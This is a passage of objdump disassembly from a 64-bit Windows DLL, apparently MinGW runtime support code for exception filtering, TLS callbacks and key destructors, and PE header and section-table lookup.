    69dc3f56:	e8 75 06 00 00       	call   0x69dc45d0
    69dc3f5b:	48 85 c0             	test   %rax,%rax
    69dc3f5e:	75 c5                	jne    0x69dc3f25
    69dc3f60:	48 85 f6             	test   %rsi,%rsi
    69dc3f63:	89 f2                	mov    %esi,%edx
    69dc3f65:	0f 84 71 ff ff ff    	je     0x69dc3edc
    69dc3f6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc3f70:	48 8d 0d a9 67 00 00 	lea    0x67a9(%rip),%rcx        # 0x69dca720
    69dc3f77:	49 89 e8             	mov    %rbp,%r8
    69dc3f7a:	ff 15 f4 83 00 00    	call   *0x83f4(%rip)        # 0x69dcc374
    69dc3f80:	e9 57 ff ff ff       	jmp    0x69dc3edc
    69dc3f85:	ba 20 00 00 00       	mov    $0x20,%edx
    69dc3f8a:	eb e4                	jmp    0x69dc3f70
    69dc3f8c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc3f90:	53                   	push   %rbx
    69dc3f91:	48 83 ec 20          	sub    $0x20,%rsp
    69dc3f95:	48 8b 11             	mov    (%rcx),%rdx
    69dc3f98:	8b 02                	mov    (%rdx),%eax
    69dc3f9a:	48 89 cb             	mov    %rcx,%rbx
    69dc3f9d:	89 c1                	mov    %eax,%ecx
    69dc3f9f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
    69dc3fa5:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
    69dc3fab:	0f 84 bf 00 00 00    	je     0x69dc4070
    69dc3fb1:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    69dc3fb6:	77 68                	ja     0x69dc4020
    69dc3fb8:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    69dc3fbd:	73 7c                	jae    0x69dc403b
    69dc3fbf:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    69dc3fc4:	0f 84 b0 00 00 00    	je     0x69dc407a
    69dc3fca:	0f 87 f4 00 00 00    	ja     0x69dc40c4
    69dc3fd0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    69dc3fd5:	0f 84 9f 00 00 00    	je     0x69dc407a
    69dc3fdb:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    69dc3fe0:	75 1f                	jne    0x69dc4001
    69dc3fe2:	31 d2                	xor    %edx,%edx
    69dc3fe4:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc3fe9:	e8 52 0d 00 00       	call   0x69dc4d40
    69dc3fee:	48 83 f8 01          	cmp    $0x1,%rax
    69dc3ff2:	0f 84 51 01 00 00    	je     0x69dc4149
    69dc3ff8:	48 85 c0             	test   %rax,%rax
    69dc3ffb:	0f 85 0f 01 00 00    	jne    0x69dc4110
    69dc4001:	48 8b 05 f8 65 00 00 	mov    0x65f8(%rip),%rax        # 0x69dca600
    69dc4008:	48 85 c0             	test   %rax,%rax
    69dc400b:	0f 84 10 01 00 00    	je     0x69dc4121
    69dc4011:	48 89 d9             	mov    %rbx,%rcx
    69dc4014:	48 83 c4 20          	add    $0x20,%rsp
    69dc4018:	5b                   	pop    %rbx
    69dc4019:	48 ff e0             	rex.W jmp *%rax
    69dc401c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc4020:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    69dc4025:	0f 84 b5 00 00 00    	je     0x69dc40e0
    69dc402b:	77 58                	ja     0x69dc4085
    69dc402d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    69dc4032:	74 46                	je     0x69dc407a
    69dc4034:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    69dc4039:	75 c6                	jne    0x69dc4001
    69dc403b:	31 d2                	xor    %edx,%edx
    69dc403d:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4042:	e8 f9 0c 00 00       	call   0x69dc4d40
    69dc4047:	48 83 f8 01          	cmp    $0x1,%rax
    69dc404b:	0f 84 df 00 00 00    	je     0x69dc4130
    69dc4051:	48 85 c0             	test   %rax,%rax
    69dc4054:	74 ab                	je     0x69dc4001
    69dc4056:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc405b:	ff d0                	call   *%rax
    69dc405d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4062:	48 83 c4 20          	add    $0x20,%rsp
    69dc4066:	5b                   	pop    %rbx
    69dc4067:	c3                   	ret
    69dc4068:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc406f:	00 
    69dc4070:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
    69dc4074:	0f 85 37 ff ff ff    	jne    0x69dc3fb1
    69dc407a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc407f:	48 83 c4 20          	add    $0x20,%rsp
    69dc4083:	5b                   	pop    %rbx
    69dc4084:	c3                   	ret
    69dc4085:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    69dc408a:	74 ee                	je     0x69dc407a
    69dc408c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    69dc4091:	0f 85 6a ff ff ff    	jne    0x69dc4001
    69dc4097:	31 d2                	xor    %edx,%edx
    69dc4099:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc409e:	e8 9d 0c 00 00       	call   0x69dc4d40
    69dc40a3:	48 83 f8 01          	cmp    $0x1,%rax
    69dc40a7:	0f 84 b3 00 00 00    	je     0x69dc4160
    69dc40ad:	48 85 c0             	test   %rax,%rax
    69dc40b0:	0f 84 4b ff ff ff    	je     0x69dc4001
    69dc40b6:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc40bb:	ff d0                	call   *%rax
    69dc40bd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc40c2:	eb 9e                	jmp    0x69dc4062
    69dc40c4:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    69dc40c9:	74 cc                	je     0x69dc4097
    69dc40cb:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    69dc40d0:	0f 85 2b ff ff ff    	jne    0x69dc4001
    69dc40d6:	eb a2                	jmp    0x69dc407a
    69dc40d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc40df:	00 
    69dc40e0:	31 d2                	xor    %edx,%edx
    69dc40e2:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc40e7:	e8 54 0c 00 00       	call   0x69dc4d40
    69dc40ec:	48 83 f8 01          	cmp    $0x1,%rax
    69dc40f0:	0f 85 5b ff ff ff    	jne    0x69dc4051
    69dc40f6:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc40fb:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4100:	e8 3b 0c 00 00       	call   0x69dc4d40
    69dc4105:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc410a:	e9 53 ff ff ff       	jmp    0x69dc4062
    69dc410f:	90                   	nop
    69dc4110:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc4115:	ff d0                	call   *%rax
    69dc4117:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc411c:	e9 41 ff ff ff       	jmp    0x69dc4062
    69dc4121:	31 c0                	xor    %eax,%eax
    69dc4123:	e9 3a ff ff ff       	jmp    0x69dc4062
    69dc4128:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc412f:	00 
    69dc4130:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc4135:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc413a:	e8 01 0c 00 00       	call   0x69dc4d40
    69dc413f:	e8 8c 06 00 00       	call   0x69dc47d0
    69dc4144:	e9 31 ff ff ff       	jmp    0x69dc407a
    69dc4149:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc414e:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc4153:	e8 e8 0b 00 00       	call   0x69dc4d40
    69dc4158:	83 c8 ff             	or     $0xffffffff,%eax
    69dc415b:	e9 02 ff ff ff       	jmp    0x69dc4062
    69dc4160:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc4165:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc416a:	e8 d1 0b 00 00       	call   0x69dc4d40
    69dc416f:	83 c8 ff             	or     $0xffffffff,%eax
    69dc4172:	e9 eb fe ff ff       	jmp    0x69dc4062
    69dc4177:	90                   	nop
    69dc4178:	90                   	nop
    69dc4179:	90                   	nop
    69dc417a:	90                   	nop
    69dc417b:	90                   	nop
    69dc417c:	90                   	nop
    69dc417d:	90                   	nop
    69dc417e:	90                   	nop
    69dc417f:	90                   	nop
    69dc4180:	55                   	push   %rbp
    69dc4181:	57                   	push   %rdi
    69dc4182:	56                   	push   %rsi
    69dc4183:	53                   	push   %rbx
    69dc4184:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4188:	48 8d 0d 31 67 00 00 	lea    0x6731(%rip),%rcx        # 0x69dca8c0
    69dc418f:	ff 15 3f 81 00 00    	call   *0x813f(%rip)        # 0x69dcc2d4
    69dc4195:	48 8b 1d 04 67 00 00 	mov    0x6704(%rip),%rbx        # 0x69dca8a0
    69dc419c:	48 85 db             	test   %rbx,%rbx
    69dc419f:	74 33                	je     0x69dc41d4
    69dc41a1:	48 8b 2d 0c 82 00 00 	mov    0x820c(%rip),%rbp        # 0x69dcc3b4
    69dc41a8:	48 8b 3d 4d 81 00 00 	mov    0x814d(%rip),%rdi        # 0x69dcc2fc
    69dc41af:	90                   	nop
    69dc41b0:	8b 0b                	mov    (%rbx),%ecx
    69dc41b2:	ff d5                	call   *%rbp
    69dc41b4:	48 89 c6             	mov    %rax,%rsi
    69dc41b7:	ff d7                	call   *%rdi
    69dc41b9:	85 c0                	test   %eax,%eax
    69dc41bb:	75 0e                	jne    0x69dc41cb
    69dc41bd:	48 85 f6             	test   %rsi,%rsi
    69dc41c0:	74 09                	je     0x69dc41cb
    69dc41c2:	48 8b 43 08          	mov    0x8(%rbx),%rax
    69dc41c6:	48 89 f1             	mov    %rsi,%rcx
    69dc41c9:	ff d0                	call   *%rax
    69dc41cb:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
    69dc41cf:	48 85 db             	test   %rbx,%rbx
    69dc41d2:	75 dc                	jne    0x69dc41b0
    69dc41d4:	48 8d 0d e5 66 00 00 	lea    0x66e5(%rip),%rcx        # 0x69dca8c0
    69dc41db:	48 83 c4 28          	add    $0x28,%rsp
    69dc41df:	5b                   	pop    %rbx
    69dc41e0:	5e                   	pop    %rsi
    69dc41e1:	5f                   	pop    %rdi
    69dc41e2:	5d                   	pop    %rbp
    69dc41e3:	48 ff 25 6a 81 00 00 	rex.W jmp *0x816a(%rip)        # 0x69dcc354
    69dc41ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc41f0:	55                   	push   %rbp
    69dc41f1:	57                   	push   %rdi
    69dc41f2:	56                   	push   %rsi
    69dc41f3:	53                   	push   %rbx
    69dc41f4:	48 83 ec 28          	sub    $0x28,%rsp
    69dc41f8:	8b 05 aa 66 00 00    	mov    0x66aa(%rip),%eax        # 0x69dca8a8
    69dc41fe:	31 f6                	xor    %esi,%esi
    69dc4200:	85 c0                	test   %eax,%eax
    69dc4202:	89 cd                	mov    %ecx,%ebp
    69dc4204:	48 89 d7             	mov    %rdx,%rdi
    69dc4207:	75 0b                	jne    0x69dc4214
    69dc4209:	89 f0                	mov    %esi,%eax
    69dc420b:	48 83 c4 28          	add    $0x28,%rsp
    69dc420f:	5b                   	pop    %rbx
    69dc4210:	5e                   	pop    %rsi
    69dc4211:	5f                   	pop    %rdi
    69dc4212:	5d                   	pop    %rbp
    69dc4213:	c3                   	ret
    69dc4214:	ba 18 00 00 00       	mov    $0x18,%edx
    69dc4219:	b9 01 00 00 00       	mov    $0x1,%ecx
    69dc421e:	e8 95 0b 00 00       	call   0x69dc4db8
    69dc4223:	48 85 c0             	test   %rax,%rax
    69dc4226:	48 89 c3             	mov    %rax,%rbx
    69dc4229:	74 3d                	je     0x69dc4268
    69dc422b:	89 28                	mov    %ebp,(%rax)
    69dc422d:	48 8d 0d 8c 66 00 00 	lea    0x668c(%rip),%rcx        # 0x69dca8c0
    69dc4234:	48 89 78 08          	mov    %rdi,0x8(%rax)
    69dc4238:	ff 15 96 80 00 00    	call   *0x8096(%rip)        # 0x69dcc2d4
    69dc423e:	48 8b 05 5b 66 00 00 	mov    0x665b(%rip),%rax        # 0x69dca8a0
    69dc4245:	48 8d 0d 74 66 00 00 	lea    0x6674(%rip),%rcx        # 0x69dca8c0
    69dc424c:	48 89 1d 4d 66 00 00 	mov    %rbx,0x664d(%rip)        # 0x69dca8a0
    69dc4253:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69dc4257:	ff 15 f7 80 00 00    	call   *0x80f7(%rip)        # 0x69dcc354
    69dc425d:	89 f0                	mov    %esi,%eax
    69dc425f:	48 83 c4 28          	add    $0x28,%rsp
    69dc4263:	5b                   	pop    %rbx
    69dc4264:	5e                   	pop    %rsi
    69dc4265:	5f                   	pop    %rdi
    69dc4266:	5d                   	pop    %rbp
    69dc4267:	c3                   	ret
    69dc4268:	be ff ff ff ff       	mov    $0xffffffff,%esi
    69dc426d:	eb 9a                	jmp    0x69dc4209
    69dc426f:	90                   	nop
    69dc4270:	53                   	push   %rbx
    69dc4271:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4275:	8b 05 2d 66 00 00    	mov    0x662d(%rip),%eax        # 0x69dca8a8
    69dc427b:	85 c0                	test   %eax,%eax
    69dc427d:	89 cb                	mov    %ecx,%ebx
    69dc427f:	75 0f                	jne    0x69dc4290
    69dc4281:	31 c0                	xor    %eax,%eax
    69dc4283:	48 83 c4 20          	add    $0x20,%rsp
    69dc4287:	5b                   	pop    %rbx
    69dc4288:	c3                   	ret
    69dc4289:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    69dc4290:	48 8d 0d 29 66 00 00 	lea    0x6629(%rip),%rcx        # 0x69dca8c0
    69dc4297:	ff 15 37 80 00 00    	call   *0x8037(%rip)        # 0x69dcc2d4
    69dc429d:	48 8b 05 fc 65 00 00 	mov    0x65fc(%rip),%rax        # 0x69dca8a0
    69dc42a4:	48 85 c0             	test   %rax,%rax
    69dc42a7:	74 1a                	je     0x69dc42c3
    69dc42a9:	8b 10                	mov    (%rax),%edx
    69dc42ab:	39 d3                	cmp    %edx,%ebx
    69dc42ad:	75 0b                	jne    0x69dc42ba
    69dc42af:	eb 4f                	jmp    0x69dc4300
    69dc42b1:	8b 11                	mov    (%rcx),%edx
    69dc42b3:	39 da                	cmp    %ebx,%edx
    69dc42b5:	74 29                	je     0x69dc42e0
    69dc42b7:	48 89 c8             	mov    %rcx,%rax
    69dc42ba:	48 8b 48 10          	mov    0x10(%rax),%rcx
    69dc42be:	48 85 c9             	test   %rcx,%rcx
    69dc42c1:	75 ee                	jne    0x69dc42b1
    69dc42c3:	48 8d 0d f6 65 00 00 	lea    0x65f6(%rip),%rcx        # 0x69dca8c0
    69dc42ca:	ff 15 84 80 00 00    	call   *0x8084(%rip)        # 0x69dcc354
    69dc42d0:	31 c0                	xor    %eax,%eax
    69dc42d2:	48 83 c4 20          	add    $0x20,%rsp
    69dc42d6:	5b                   	pop    %rbx
    69dc42d7:	c3                   	ret
    69dc42d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc42df:	00 
    69dc42e0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
    69dc42e4:	48 89 50 10          	mov    %rdx,0x10(%rax)
    69dc42e8:	e8 9b 0a 00 00       	call   0x69dc4d88
    69dc42ed:	48 8d 0d cc 65 00 00 	lea    0x65cc(%rip),%rcx        # 0x69dca8c0
    69dc42f4:	ff 15 5a 80 00 00    	call   *0x805a(%rip)        # 0x69dcc354
    69dc42fa:	eb d4                	jmp    0x69dc42d0
    69dc42fc:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc4300:	48 8b 50 10          	mov    0x10(%rax),%rdx
    69dc4304:	48 89 c1             	mov    %rax,%rcx
    69dc4307:	48 89 15 92 65 00 00 	mov    %rdx,0x6592(%rip)        # 0x69dca8a0
    69dc430e:	eb d8                	jmp    0x69dc42e8
    69dc4310:	53                   	push   %rbx
    69dc4311:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4315:	83 fa 01             	cmp    $0x1,%edx
    69dc4318:	0f 84 92 00 00 00    	je     0x69dc43b0
    69dc431e:	72 30                	jb     0x69dc4350
    69dc4320:	83 fa 02             	cmp    $0x2,%edx
    69dc4323:	74 1b                	je     0x69dc4340
    69dc4325:	83 fa 03             	cmp    $0x3,%edx
    69dc4328:	75 1b                	jne    0x69dc4345
    69dc432a:	8b 05 78 65 00 00    	mov    0x6578(%rip),%eax        # 0x69dca8a8
    69dc4330:	85 c0                	test   %eax,%eax
    69dc4332:	74 11                	je     0x69dc4345
    69dc4334:	e8 47 fe ff ff       	call   0x69dc4180
    69dc4339:	eb 0a                	jmp    0x69dc4345
    69dc433b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc4340:	e8 8b 04 00 00       	call   0x69dc47d0
    69dc4345:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc434a:	48 83 c4 20          	add    $0x20,%rsp
    69dc434e:	5b                   	pop    %rbx
    69dc434f:	c3                   	ret
    69dc4350:	8b 05 52 65 00 00    	mov    0x6552(%rip),%eax        # 0x69dca8a8
    69dc4356:	85 c0                	test   %eax,%eax
    69dc4358:	0f 85 82 00 00 00    	jne    0x69dc43e0
    69dc435e:	8b 05 44 65 00 00    	mov    0x6544(%rip),%eax        # 0x69dca8a8
    69dc4364:	83 f8 01             	cmp    $0x1,%eax
    69dc4367:	75 dc                	jne    0x69dc4345
    69dc4369:	48 8b 0d 30 65 00 00 	mov    0x6530(%rip),%rcx        # 0x69dca8a0
    69dc4370:	48 85 c9             	test   %rcx,%rcx
    69dc4373:	74 11                	je     0x69dc4386
    69dc4375:	48 8b 59 10          	mov    0x10(%rcx),%rbx
    69dc4379:	e8 0a 0a 00 00       	call   0x69dc4d88
    69dc437e:	48 85 db             	test   %rbx,%rbx
    69dc4381:	48 89 d9             	mov    %rbx,%rcx
    69dc4384:	75 ef                	jne    0x69dc4375
    69dc4386:	48 8d 0d 33 65 00 00 	lea    0x6533(%rip),%rcx        # 0x69dca8c0
    69dc438d:	48 c7 05 08 65 00 00 	movq   $0x0,0x6508(%rip)        # 0x69dca8a0
    69dc4394:	00 00 00 00 
    69dc4398:	c7 05 06 65 00 00 00 	movl   $0x0,0x6506(%rip)        # 0x69dca8a8
    69dc439f:	00 00 00 
    69dc43a2:	ff 15 1c 7f 00 00    	call   *0x7f1c(%rip)        # 0x69dcc2c4
    69dc43a8:	eb 9b                	jmp    0x69dc4345
    69dc43aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc43b0:	8b 05 f2 64 00 00    	mov    0x64f2(%rip),%eax        # 0x69dca8a8
    69dc43b6:	85 c0                	test   %eax,%eax
    69dc43b8:	74 16                	je     0x69dc43d0
    69dc43ba:	c7 05 e4 64 00 00 01 	movl   $0x1,0x64e4(%rip)        # 0x69dca8a8
    69dc43c1:	00 00 00 
    69dc43c4:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc43c9:	48 83 c4 20          	add    $0x20,%rsp
    69dc43cd:	5b                   	pop    %rbx
    69dc43ce:	c3                   	ret
    69dc43cf:	90                   	nop
    69dc43d0:	48 8d 0d e9 64 00 00 	lea    0x64e9(%rip),%rcx        # 0x69dca8c0
    69dc43d7:	ff 15 67 7f 00 00    	call   *0x7f67(%rip)        # 0x69dcc344
    69dc43dd:	eb db                	jmp    0x69dc43ba
    69dc43df:	90                   	nop
    69dc43e0:	e8 9b fd ff ff       	call   0x69dc4180
    69dc43e5:	e9 74 ff ff ff       	jmp    0x69dc435e
    69dc43ea:	90                   	nop
    69dc43eb:	90                   	nop
    69dc43ec:	90                   	nop
    69dc43ed:	90                   	nop
    69dc43ee:	90                   	nop
    69dc43ef:	90                   	nop
    69dc43f0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    69dc43f4:	48 01 c1             	add    %rax,%rcx
    69dc43f7:	31 c0                	xor    %eax,%eax
    69dc43f9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
    69dc43ff:	74 01                	je     0x69dc4402
    69dc4401:	c3                   	ret
    69dc4402:	31 c0                	xor    %eax,%eax
    69dc4404:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
    69dc440a:	0f 94 c0             	sete   %al
    69dc440d:	c3                   	ret
    69dc440e:	66 90                	xchg   %ax,%ax
    69dc4410:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    69dc4415:	74 09                	je     0x69dc4420
    69dc4417:	31 c0                	xor    %eax,%eax
    69dc4419:	c3                   	ret
    69dc441a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc4420:	eb ce                	jmp    0x69dc43f0
    69dc4422:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc4426:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc442d:	00 00 00 
    69dc4430:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
    69dc4434:	48 01 c1             	add    %rax,%rcx
    69dc4437:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    69dc443b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    69dc4440:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    69dc4444:	85 c9                	test   %ecx,%ecx
    69dc4446:	74 29                	je     0x69dc4471
    69dc4448:	83 e9 01             	sub    $0x1,%ecx
    69dc444b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    69dc444f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
    69dc4454:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    69dc4458:	49 39 d0             	cmp    %rdx,%r8
    69dc445b:	4c 89 c1             	mov    %r8,%rcx
    69dc445e:	77 08                	ja     0x69dc4468
    69dc4460:	03 48 08             	add    0x8(%rax),%ecx
    69dc4463:	48 39 d1             	cmp    %rdx,%rcx
    69dc4466:	77 0b                	ja     0x69dc4473
    69dc4468:	48 83 c0 28          	add    $0x28,%rax
    69dc446c:	4c 39 c8             	cmp    %r9,%rax
    69dc446f:	75 e3                	jne    0x69dc4454
    69dc4471:	31 c0                	xor    %eax,%eax
    69dc4473:	c3                   	ret
    69dc4474:	66 90                	xchg   %ax,%ax
    69dc4476:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc447d:	00 00 00 
    69dc4480:	57                   	push   %rdi
    69dc4481:	56                   	push   %rsi
    69dc4482:	53                   	push   %rbx
    69dc4483:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4487:	48 89 ce             	mov    %rcx,%rsi
    69dc448a:	e8 a1 08 00 00       	call   0x69dc4d30
    69dc448f:	48 83 f8 08          	cmp    $0x8,%rax
    69dc4493:	77 6b                	ja     0x69dc4500
    69dc4495:	48 8b 15 54 2f 00 00 	mov    0x2f54(%rip),%rdx        # 0x69dc73f0
    69dc449c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    69dc44a1:	75 5d                	jne    0x69dc4500
    69dc44a3:	48 89 d1             	mov    %rdx,%rcx
    69dc44a6:	e8 45 ff ff ff       	call   0x69dc43f0
    69dc44ab:	85 c0                	test   %eax,%eax
    69dc44ad:	74 51                	je     0x69dc4500
    69dc44af:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
    69dc44b3:	48 01 d1             	add    %rdx,%rcx
    69dc44b6:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    69dc44ba:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
    69dc44bf:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
    69dc44c3:	85 c0                	test   %eax,%eax
    69dc44c5:	74 39                	je     0x69dc4500
    69dc44c7:	83 e8 01             	sub    $0x1,%eax
    69dc44ca:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    69dc44ce:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
    69dc44d3:	eb 09                	jmp    0x69dc44de
    69dc44d5:	48 83 c3 28          	add    $0x28,%rbx
    69dc44d9:	48 39 fb             	cmp    %rdi,%rbx
    69dc44dc:	74 22                	je     0x69dc4500
    69dc44de:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    69dc44e4:	48 89 f2             	mov    %rsi,%rdx
    69dc44e7:	48 89 d9             	mov    %rbx,%rcx
    69dc44ea:	e8 39 08 00 00       	call   0x69dc4d28
    69dc44ef:	85 c0                	test   %eax,%eax
    69dc44f1:	75 e2                	jne    0x69dc44d5
    69dc44f3:	48 89 d8             	mov    %rbx,%rax
    69dc44f6:	48 83 c4 20          	add    $0x20,%rsp
    69dc44fa:	5b                   	pop    %rbx
    69dc44fb:	5e                   	pop    %rsi
    69dc44fc:	5f                   	pop    %rdi
    69dc44fd:	c3                   	ret
    69dc44fe:	66 90                	xchg   %ax,%ax
    69dc4500:	31 db                	xor    %ebx,%ebx
    69dc4502:	48 89 d8             	mov    %rbx,%rax
    69dc4505:	48 83 c4 20          	add    $0x20,%rsp
    69dc4509:	5b                   	pop    %rbx
    69dc450a:	5e                   	pop    %rsi
    69dc450b:	5f                   	pop    %rdi
    69dc450c:	c3                   	ret
    69dc450d:	0f 1f 00             	nopl   (%rax)
    69dc4510:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4514:	4c 8b 05 d5 2e 00 00 	mov    0x2ed5(%rip),%r8        # 0x69dc73f0
    69dc451b:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    69dc4521:	48 89 ca             	mov    %rcx,%rdx
    69dc4524:	75 57                	jne    0x69dc457d
    69dc4526:	4c 89 c1             	mov    %r8,%rcx
    69dc4529:	e8 c2 fe ff ff       	call   0x69dc43f0
    69dc452e:	85 c0                	test   %eax,%eax
    69dc4530:	74 4b                	je     0x69dc457d
    69dc4532:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    69dc4536:	48 89 d1             	mov    %rdx,%rcx
    69dc4539:	4c 29 c1             	sub    %r8,%rcx
    69dc453c:	49 01 c0             	add    %rax,%r8
    69dc453f:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    69dc4544:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    69dc4549:	85 d2                	test   %edx,%edx
    69dc454b:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    69dc4550:	74 2b                	je     0x69dc457d
    69dc4552:	83 ea 01             	sub    $0x1,%edx
    69dc4555:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    69dc4559:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    69dc455e:	66 90                	xchg   %ax,%ax
    69dc4560:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    69dc4564:	4c 39 c1             	cmp    %r8,%rcx
    69dc4567:	4c 89 c2             	mov    %r8,%rdx
    69dc456a:	72 08                	jb     0x69dc4574
    69dc456c:	03 50 08             	add    0x8(%rax),%edx
    69dc456f:	48 39 d1             	cmp    %rdx,%rcx
    69dc4572:	72 0b                	jb     0x69dc457f
    69dc4574:	48 83 c0 28          	add    $0x28,%rax
    69dc4578:	4c 39 c8             	cmp    %r9,%rax
    69dc457b:	75 e3                	jne    0x69dc4560
    69dc457d:	31 c0                	xor    %eax,%eax
    69dc457f:	48 83 c4 28          	add    $0x28,%rsp
    69dc4583:	c3                   	ret
    69dc4584:	66 90                	xchg   %ax,%ax
    69dc4586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc458d:	00 00 00 
    69dc4590:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4594:	48 8b 15 55 2e 00 00 	mov    0x2e55(%rip),%rdx        # 0x69dc73f0
    69dc459b:	45 31 c0             	xor    %r8d,%r8d
    69dc459e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    69dc45a3:	74 0b                	je     0x69dc45b0
    69dc45a5:	44 89 c0             	mov    %r8d,%eax
    69dc45a8:	48 83 c4 28          	add    $0x28,%rsp
    69dc45ac:	c3                   	ret
    69dc45ad:	0f 1f 00             	nopl   (%rax)
    69dc45b0:	48 89 d1             	mov    %rdx,%rcx
    69dc45b3:	e8 38 fe ff ff       	call   0x69dc43f0
    69dc45b8:	85 c0                	test   %eax,%eax
    69dc45ba:	74 e9                	je     0x69dc45a5
    69dc45bc:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
    69dc45c0:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
    69dc45c6:	44 89 c0             	mov    %r8d,%eax
    69dc45c9:	48 83 c4 28          	add    $0x28,%rsp
    69dc45cd:	c3                   	ret
    69dc45ce:	66 90                	xchg   %ax,%ax
    69dc45d0:	48 83 ec 28          	sub    $0x28,%rsp
    69dc45d4:	4c 8b 05 15 2e 00 00 	mov    0x2e15(%rip),%r8        # 0x69dc73f0
    69dc45db:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    69dc45e1:	48 89 ca             	mov    %rcx,%rdx
    69dc45e4:	75 52                	jne    0x69dc4638
    69dc45e6:	4c 89 c1             	mov    %r8,%rcx
    69dc45e9:	e8 02 fe ff ff       	call   0x69dc43f0
    69dc45ee:	85 c0                	test   %eax,%eax
    69dc45f0:	74 46                	je     0x69dc4638
    69dc45f2:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
    69dc45f6:	4c 01 c1             	add    %r8,%rcx
